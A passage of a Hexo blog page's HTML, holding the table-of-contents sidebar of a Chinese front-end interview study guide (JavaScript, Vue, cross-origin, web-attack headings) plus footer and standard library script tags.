class="nav-text">静态（词法）作用域语言 和 动态作用域语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js事件模型"><span class="nav-number">13.</span> <span class="nav-text">js事件模型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js设计模式"><span class="nav-number">14.</span> <span class="nav-text">js设计模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工厂模式"><span class="nav-number">14.1.</span> <span class="nav-text">工厂模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单例模式"><span class="nav-number">14.2.</span> <span class="nav-text">单例模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原型模式"><span class="nav-number">14.3.</span> <span class="nav-text">原型模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#迭代器模式（遍历器模式）"><span class="nav-number">14.4.</span> <span class="nav-text">迭代器模式（遍历器模式）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#观察者模式（发布-订阅模式）"><span class="nav-number">14.5.</span> <span class="nav-text">观察者模式（发布-订阅模式）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gulp和grunt的不同"><span class="nav-number">15.</span> <span class="nav-text">gulp和grunt的不同</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript的数据类型（按存储方式区分）："><span class="nav-number">16.</span> <span class="nav-text">JavaScript的数据类型（按存储方式区分）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript三大对象"><span class="nav-number">17.</span> <span class="nav-text">JavaScript三大对象</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强制（显式）类型转换和隐式类型转换"><span class="nav-number">18.</span> <span class="nav-text">强制（显式）类型转换和隐式类型转换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#强制（显式）类型转换"><span class="nav-number">18.1.</span> <span class="nav-text">强制（显式）类型转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐式类型转换"><span class="nav-number">18.2.</span> <span class="nav-text">隐式类型转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原型链"><span class="nav-number">19.</span> <span class="nav-text">原型链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#创建对象的几种方式"><span class="nav-number">19.1.</span> <span class="nav-text">创建对象的几种方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造函数扩展"><span class="nav-number">19.2.</span> <span class="nav-text">构造函数扩展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原型规则"><span class="nav-number">19.3.</span> <span class="nav-text">原型规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#循环对象自身的属性"><span class="nav-number">19.4.</span> <span class="nav-text">循环对象自身的属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#instanceof"><span class="nav-number">19.5.</span> <span class="nav-text">instanceof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造函数、原型对象、实例、原型链关系网"><span class="nav-number">19.6.</span> <span class="nav-text">构造函数、原型对象、实例、原型链关系网</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：写一个原型链继承的demo"><span class="nav-number">19.7.</span> <span class="nav-text">面试题：写一个原型链继承的demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：写一个实际应用中使用原型链的例子"><span class="nav-number">19.8.</span> <span class="nav-text">面试题：写一个实际应用中使用原型链的例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：描述-new-一个对象的过程"><span class="nav-number">19.9.</span> <span class="nav-text">面试题：描述 new 一个对象的过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#面向对象"><span class="nav-number">20.</span> <span class="nav-text">面向对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是面向对象"><span class="nav-number">20.1.</span> <span class="nav-text">什么是面向对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定义类"><span class="nav-number">20.2.</span> <span class="nav-text">定义类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ES5继承"><span class="nav-number">20.3.</span> <span class="nav-text">ES5继承</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、借助构造函数实现简单继承"><span class="nav-number">20.3.1.</span> <span class="nav-text">1、借助构造函数实现简单继承</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、借助原型链实现继承"><span class="nav-number">20.3.2.</span> <span class="nav-text">2、借助原型链实现继承</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、组合方法（构造函数-原型链）"><span class="nav-number">20.3.3.</span> <span class="nav-text">3、组合方法（构造函数 + 原型链）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、组合方法优化1（构造函数-原型链）"><span class="nav-number">20.3.4.</span> <span class="nav-text">4、组合方法优化1（构造函数 + 原型链）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、组合方法优化2（构造函数-原型链）"><span class="nav-number">20.3.5.</span> <span class="nav-text">5、组合方法优化2（构造函数 + 原型链）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ES6-Class继承"><span class="nav-number">20.4.</span> <span class="nav-text">ES6 Class继承</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#类的申明"><span class="nav-number">20.4.1.</span> <span class="nav-text">类的申明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类的继承"><span class="nav-number">20.4.2.</span> <span class="nav-text">类的继承</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩建Array"><span class="nav-number">20.5.</span> <span class="nav-text">扩建Array</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#typeof-和-instanceof"><span class="nav-number">21.</span> <span class="nav-text">typeof 和 instanceof</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#typeof"><span class="nav-number">21.1.</span> <span class="nav-text">typeof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#instanceOf"><span class="nav-number">21.2.</span> <span class="nav-text">instanceOf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js检测一个变量是String类型"><span class="nav-number">22.</span> <span class="nav-text">js检测一个变量是String类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js检测一个变量是Array类型"><span class="nav-number">23.</span> <span class="nav-text">js检测一个变量是Array类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null-和-undefined的区别"><span class="nav-number">24.</span> <span class="nav-text">null 和 undefined的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js浅拷贝和深拷贝（针对引用类型数据Object）"><span class="nav-number">25.</span> <span class="nav-text">js浅拷贝和深拷贝（针对引用类型数据Object）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js实现map、forEach、filter、reduce高阶函数"><span class="nav-number">26.</span> <span class="nav-text">js实现map、forEach、filter、reduce高阶函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#js实现map方法"><span class="nav-number">26.1.</span> <span class="nav-text">js实现map方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js实现forEach方法"><span class="nav-number">26.2.</span> <span class="nav-text">js实现forEach方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js实现filter方法-基本同map"><span class="nav-number">26.3.</span> <span class="nav-text">js实现filter方法(基本同map)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js实现reduce方法"><span class="nav-number">26.4.</span> <span class="nav-text">js实现reduce方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#forEach-和-map的区别"><span class="nav-number">27.</span> <span class="nav-text">forEach 和 map的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#map、forEach、every、some、-each、for…in、es6-for…of等用法"><span class="nav-number">28.</span> <span class="nav-text">map、forEach、every、some、$.each、for…in、es6 for…of等用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#map"><span class="nav-number">28.1.</span> <span class="nav-text">map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#forEach"><span class="nav-number">28.2.</span> <span class="nav-text">forEach</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#every"><span class="nav-number">28.3.</span> <span class="nav-text">every</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#some"><span class="nav-number">28.4.</span> <span class="nav-text">some</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#each"><span class="nav-number">28.5.</span> <span class="nav-text">$.each</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#for…in"><span class="nav-number">28.6.</span> <span class="nav-text">for…in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#es6-for…of"><span class="nav-number">28.7.</span> <span class="nav-text">es6 for…of</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高阶函数"><span class="nav-number">29.</span> <span class="nav-text">高阶函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#作用域与闭包"><span class="nav-number">30.</span> <span class="nav-text">作用域与闭包</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#作用域"><span class="nav-number">30.1.</span> <span class="nav-text">作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#作用域链"><span class="nav-number">30.2.</span> <span class="nav-text">作用域链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行上下文"><span class="nav-number">30.3.</span> <span class="nav-text">执行上下文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#this"><span class="nav-number">30.4.</span> <span class="nav-text">this</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#闭包"><span class="nav-number">30.5.</span> <span class="nav-text">闭包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：变量提升"><span class="nav-number">30.6.</span> <span class="nav-text">面试题：变量提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：this的作用"><span class="nav-number">30.7.</span> <span class="nav-text">面试题：this的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：创建10个a标签，点击的时候弹出序号"><span class="nav-number">30.8.</span> <span class="nav-text">面试题：创建10个a标签，点击的时候弹出序号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：如何理解作用域"><span class="nav-number">30.9.</span> <span class="nav-text">面试题：如何理解作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试题：实际开发中闭包的使用"><span class="nav-number">30.10.</span> <span class="nav-text">面试题：实际开发中闭包的使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#闭包-1"><span class="nav-number">31.</span> <span class="nav-text">闭包</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是闭包"><span class="nav-number">31.1.</span> <span class="nav-text">什么是闭包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例"><span class="nav-number">31.2.</span> <span class="nav-text">案例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见用途"><span class="nav-number">31.3.</span> <span class="nav-text">常见用途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#闭包优缺点"><span class="nav-number">31.4.</span> <span class="nav-text">闭包优缺点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现一个持续的动画"><span class="nav-number">32.</span> <span class="nav-text">实现一个持续的动画</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#css-animation"><span class="nav-number">32.1.</span> <span class="nav-text">css animation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js"><span class="nav-number">32.2.</span> <span class="nav-text">js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#requestAnimationFrame和setTimeout区别"><span class="nav-number">33.</span> <span class="nav-text">requestAnimationFrame和setTimeout区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通信"><span class="nav-number">34.</span> <span class="nav-text">通信</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#同源策略"><span class="nav-number">34.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前后端如何通信"><span class="nav-number">34.2.</span> <span class="nav-text">前后端如何通信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何创建Ajax"><span class="nav-number">34.3.</span> <span class="nav-text">如何创建Ajax</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前端跨域的几种解决办法"><span class="nav-number">35.</span> <span class="nav-text">前端跨域的几种解决办法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是跨域？"><span class="nav-number">35.1.</span> <span class="nav-text">什么是跨域？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见跨域场景"><span class="nav-number">35.2.</span> <span class="nav-text">常见跨域场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试时选答"><span class="nav-number">35.3.</span> <span class="nav-text">面试时选答</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨域解决方案"><span class="nav-number">35.4.</span> <span class="nav-text">跨域解决方案</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过jsonp跨域"><span class="nav-number">35.4.1.</span> <span class="nav-text">通过jsonp跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#postMessage跨域"><span class="nav-number">35.4.2.</span> <span class="nav-text">postMessage跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域资源共享（CORS）"><span class="nav-number">35.4.3.</span> <span class="nav-text">跨域资源共享（CORS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nginx代理跨域"><span class="nav-number">35.4.4.</span> <span class="nav-text">nginx代理跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nodejs中间件代理跨域"><span class="nav-number">35.4.5.</span> <span class="nav-text">nodejs中间件代理跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebSocket协议跨域"><span class="nav-number">35.4.6.</span> <span class="nav-text">WebSocket协议跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#document-domain-iframe跨域"><span class="nav-number">35.4.7.</span> <span class="nav-text">document.domain + iframe跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#location-hash-iframe"><span class="nav-number">35.4.8.</span> <span class="nav-text">location.hash + iframe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#window-name-iframe跨域"><span class="nav-number">35.4.9.</span> <span class="nav-text">window.name + iframe跨域</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#同源下不同标签的页面如何进行通信"><span class="nav-number">36.</span> <span class="nav-text">同源下不同标签的页面如何进行通信</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#localStorage"><span class="nav-number">36.1.</span> <span class="nav-text">localStorage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#websocket"><span class="nav-number">36.2.</span> <span class="nav-text">websocket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#h5-sharedWorker"><span class="nav-number">36.3.</span> <span class="nav-text">h5 sharedWorker</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出长度为100的数组"><span class="nav-number">37.</span> <span class="nav-text">输出长度为100的数组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AMD、CMD、CommonJS、ES6模块化"><span class="nav-number">38.</span> <span class="nav-text">AMD、CMD、CommonJS、ES6模块化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AMD"><span class="nav-number">38.1.</span> <span class="nav-text">AMD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMD"><span class="nav-number">38.2.</span> <span class="nav-text">CMD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AMD、CMD的区别"><span class="nav-number">38.3.</span> <span class="nav-text">AMD、CMD的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonJS"><span class="nav-number">38.4.</span> <span class="nav-text">CommonJS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ES6"><span class="nav-number">38.5.</span> <span class="nav-text">ES6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#M-V-VM"><span class="nav-number">39.</span> <span class="nav-text">M-V-VM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#核心"><span class="nav-number">39.1.</span> <span class="nav-text">核心</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#好处"><span class="nav-number">39.2.</span> <span class="nav-text">好处</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vue双向绑定原理"><span class="nav-number">40.</span> <span class="nav-text">Vue双向绑定原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vue生命周期-v2-0"><span class="nav-number">41.</span> <span class="nav-text">Vue生命周期(v2.0)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vuex原理"><span class="nav-number">42.</span> <span class="nav-text">Vuex原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vue-router-原理"><span class="nav-number">43.</span> <span class="nav-text">vue-router 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vue-nextTick实现原理"><span class="nav-number">44.</span> <span class="nav-text">Vue nextTick实现原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Promise原理"><span class="nav-number">45.</span> <span class="nav-text">Promise原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html2canvas原理"><span class="nav-number">46.</span> <span class="nav-text">html2canvas原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVG和Canvas的区别"><span class="nav-number">47.</span> <span class="nav-text">SVG和Canvas的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SVG"><span class="nav-number">47.1.</span> <span class="nav-text">SVG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Canvas"><span class="nav-number">47.2.</span> <span class="nav-text">Canvas</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#es6常用语法"><span class="nav-number">48.</span> <span class="nav-text">es6常用语法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#let的特点"><span class="nav-number">48.1.</span> <span class="nav-text">let的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#const的特点"><span class="nav-number">48.2.</span> <span class="nav-text">const的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#箭头函数和普通函数的区别"><span class="nav-number">48.3.</span> <span class="nav-text">箭头函数和普通函数的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Promise自己封装一个Ajax插件"><span class="nav-number">48.4.</span> <span class="nav-text">使用Promise自己封装一个Ajax插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的字符串方法"><span class="nav-number">48.5.</span> <span class="nav-text">常用的字符串方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的数组方法"><span class="nav-number">48.6.</span> <span class="nav-text">常用的数组方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Map"><span class="nav-number">48.7.</span> <span class="nav-text">Map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Set"><span class="nav-number">48.8.</span> <span class="nav-text">Set</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call和apply的区别"><span class="nav-number">49.</span> <span class="nav-text">call和apply的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call、apply、bind"><span class="nav-number">50.</span> <span class="nav-text">call、apply、bind</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#举例"><span class="nav-number">50.1.</span> <span class="nav-text">举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call、apply传参"><span class="nav-number">50.2.</span> <span class="nav-text">call、apply传参</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind方法"><span class="nav-number">50.3.</span> <span class="nav-text">bind方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call、apply、bind异同"><span class="nav-number">50.4.</span> <span class="nav-text">call、apply、bind异同</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何选用"><span class="nav-number">50.5.</span> <span class="nav-text">如何选用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手动模拟实现call、apply、bind"><span class="nav-number">50.6.</span> <span class="nav-text">手动模拟实现call、apply、bind</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简述http工作原理"><span class="nav-number">51.</span> <span class="nav-text">简述http工作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">51.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的http状态码："><span class="nav-number">51.2.</span> <span class="nav-text">常见的http状态码：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#几种常见web攻击手段"><span class="nav-number">52.</span> <span class="nav-text">几种常见web攻击手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-跨站脚本攻击"><span class="nav-number">52.1.</span> <span class="nav-text">XSS(跨站脚本攻击)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-跨站请求伪造"><span class="nav-number">52.2.</span> <span class="nav-text">CSRF(跨站请求伪造)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">52.3.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDOS"><span class="nav-number">52.4.</span> <span class="nav-text">DDOS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#‘1’-‘2’-‘3’-map-parseInt"><span class="nav-number">53.</span> <span class="nav-text">[‘1’, ‘2’, ‘3’].map(parseInt);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#false-为什么为true，-false-为什么为false"><span class="nav-number">54.</span> <span class="nav-text">[]==false 为什么为true，!![]==false 为什么为false</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么情况下满足-a-1-amp-amp-a-12"><span class="nav-number">55.</span> <span class="nav-text">什么情况下满足 a==1 &amp;&amp; a==12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#今日头条CSS面试题"><span class="nav-number">56.</span> <span class="nav-text">今日头条CSS面试题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#今日头条算法推导题"><span class="nav-number">57.</span> <span class="nav-text">今日头条算法推导题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#阿里钉钉面试题"><span class="nav-number">58.</span> <span class="nav-text">阿里钉钉面试题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#面试题：js连续赋值运算"><span class="nav-number">59.</span> <span class="nav-text">面试题：js连续赋值运算</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#页面渲染机制与性能优化"><span class="nav-number">60.</span> <span class="nav-text">页面渲染机制与性能优化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器渲染过程"><span class="nav-number">60.1.</span> <span class="nav-text">浏览器渲染过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js运行机制"><span class="nav-number">60.2.</span> <span class="nav-text">js运行机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#页面性能监控-performance"><span class="nav-number">60.3.</span> <span class="nav-text">页面性能监控 performance</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hash、chunkhash、contenthash"><span class="nav-number">60.3.1.</span> <span class="nav-text">hash、chunkhash、contenthash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#navigation属性-页面来源"><span class="nav-number">60.3.2.</span> <span class="nav-text">navigation属性 页面来源</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#memory属性-内存情况"><span class="nav-number">60.3.3.</span> <span class="nav-text">memory属性 内存情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#timing属性-所有的时间"><span class="nav-number">60.3.4.</span> <span class="nav-text">timing属性 所有的时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getEntries-方法-所有资源的信息"><span class="nav-number">60.3.5.</span> <span class="nav-text">getEntries()方法 所有资源的信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#页面性能优化"><span class="nav-number">60.4.</span> <span class="nav-text">页面性能优化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#网络请求的优化"><span class="nav-number">60.4.1.</span> <span class="nav-text">网络请求的优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#页面渲染性能的优化"><span class="nav-number">60.4.2.</span> <span class="nav-text">页面渲染性能的优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#面试回答"><span class="nav-number">60.4.3.</span> <span class="nav-text">面试回答</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#错误监控"><span class="nav-number">60.5.</span> <span class="nav-text">错误监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#面试"><span class="nav-number">61.</span> <span class="nav-text">面试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#技术面试"><span class="nav-number">61.1.</span> <span class="nav-text">技术面试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HR面试"><span class="nav-number">61.2.</span> <span class="nav-text">HR面试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试技巧"><span class="nav-number">61.3.</span> <span class="nav-text">面试技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#面试流程"><span class="nav-number">61.4.</span> <span class="nav-text">面试流程</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Pimi Chen</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span>网站UV</span>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span>网站PV</span>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>


        
<div class="theme-copyright-info">
  <a href="http://www.miitbeian.gov.cn">京ICP备19005272号</a>
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top" style="display:none;">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent" class="fa-percent"><span>0</span>%</span>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  



  



  
  



  
  <script type="text/javascript" src="/blog/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/blog/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/blog/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/blog/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/blog/lib/heart/heart.js"></script>

  
  <script type="text/javascript" src="/blog/lib/canvas-nest/canvas-nest.min.js"></script>

  
  <script type="text/javascript" src="/blog/lib/three/three.min.js"></script>

  
  <script type="text/javascript" src="/blog/lib/three/three-waves.min.js"></script>


  


  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/blog/js/src/affix.js?v=5.1.0"></script>

  <script type="text/javascript" src="/blog/js/src/schemes/pisces.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/blog/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/blog/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.1.0"></script>



  


  




	





  





  





  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  






  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
